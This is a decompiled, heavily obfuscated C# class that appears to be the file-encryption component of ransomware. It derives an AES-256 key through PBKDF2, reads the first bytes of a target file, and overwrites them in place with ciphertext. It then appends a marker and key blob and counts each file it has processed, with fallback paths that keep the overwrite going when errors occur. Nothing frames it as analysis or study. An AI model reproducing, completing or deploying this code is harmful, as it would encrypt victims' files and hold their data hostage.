using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace VyjVuXvolaw;

public static class laLXjNdfIrlJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] ECnCWBxOsfyplx(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = YIBQoFbKYZS(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes YIBQoFbKYZS(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] STmRWaBeQYVyn(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (CcLtuTEQJD.FTilkCJiPZSoYC == getString_0(107396845))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (CcLtuTEQJD.VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(CcLtuTEQJD.MGkBzYPheHDPb, getString_0(107387076) + string_0 + getString_0(107401860) + ex.Message + getString_0(107396316));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool aOycAYsEuHTjq(string miqsVkLePvjxa, byte[] WUAqTrQObZUDJY, byte[] WUAskcktCGjCrN = null)
	{
		try
		{
			byte[] array = null;
			if (CcLtuTEQJD.FTilkCJiPZSoYC == getString_0(107396845))
			{
				array = (CcLtuTEQJD.AcumuDDlRST ? Encoding.ASCII.GetBytes(CcLtuTEQJD.RdzltCKTqMftoSE(CcLtuTEQJD.ypzGMFIykfAhE) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401802)) + Convert.ToString(CcLtuTEQJD.SHZkgBAmdkcxAL) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401802))) : Encoding.ASCII.GetBytes(CcLtuTEQJD.RdzltCKTqMftoSE(CcLtuTEQJD.ypzGMFIykfAhE) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401843)) + Convert.ToString(CcLtuTEQJD.SHZkgBAmdkcxAL) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401843))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(miqsVkLePvjxa, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(WUAqTrQObZUDJY, 0, WUAqTrQObZUDJY.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(miqsVkLePvjxa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!CcLtuTEQJD.AcumuDDlRST)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(WUAskcktCGjCrN, 0, WUAskcktCGjCrN.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (CcLtuTEQJD.AcumuDDlRST ? Encoding.ASCII.GetBytes(CcLtuTEQJD.RdzltCKTqMftoSE(CcLtuTEQJD.ypzGMFIykfAhE) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401802)) + Convert.ToString(CcLtuTEQJD.SHZkgBAmdkcxAL) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401802))) : Encoding.ASCII.GetBytes(CcLtuTEQJD.RdzltCKTqMftoSE(CcLtuTEQJD.ypzGMFIykfAhE) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401843)) + Convert.ToString(CcLtuTEQJD.SHZkgBAmdkcxAL) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401843))));
				FileStream fileStream2 = new FileStream(miqsVkLePvjxa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(WUAqTrQObZUDJY, 0, WUAqTrQObZUDJY.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(miqsVkLePvjxa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!CcLtuTEQJD.AcumuDDlRST)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(WUAskcktCGjCrN, 0, WUAskcktCGjCrN.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			CcLtuTEQJD.ywaYFjHsMFpWdbL++;
		}
		catch (Exception ex)
		{
			if (CcLtuTEQJD.VLajbDNhoSbf)
			{
				try
				{
					File.AppendAllText(CcLtuTEQJD.MGkBzYPheHDPb, getString_0(107387076) + miqsVkLePvjxa + getString_0(107401793) + ex.Message + getString_0(107396316));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (CcLtuTEQJD.AcumuDDlRST ? Encoding.ASCII.GetBytes(CcLtuTEQJD.RdzltCKTqMftoSE(CcLtuTEQJD.ypzGMFIykfAhE) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401802)) + Convert.ToString(CcLtuTEQJD.SHZkgBAmdkcxAL) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401802))) : Encoding.ASCII.GetBytes(CcLtuTEQJD.RdzltCKTqMftoSE(CcLtuTEQJD.ypzGMFIykfAhE) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401843)) + Convert.ToString(CcLtuTEQJD.SHZkgBAmdkcxAL) + CcLtuTEQJD.RdzltCKTqMftoSE(getString_0(107401843))));
				FileStream fileStream4 = new FileStream(miqsVkLePvjxa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(WUAqTrQObZUDJY, 0, WUAqTrQObZUDJY.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(miqsVkLePvjxa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!CcLtuTEQJD.AcumuDDlRST)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(WUAskcktCGjCrN, 0, WUAskcktCGjCrN.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static laLXjNdfIrlJ()
	{
		Strings.CreateGetStringDelegate(typeof(laLXjNdfIrlJ));
	}
}
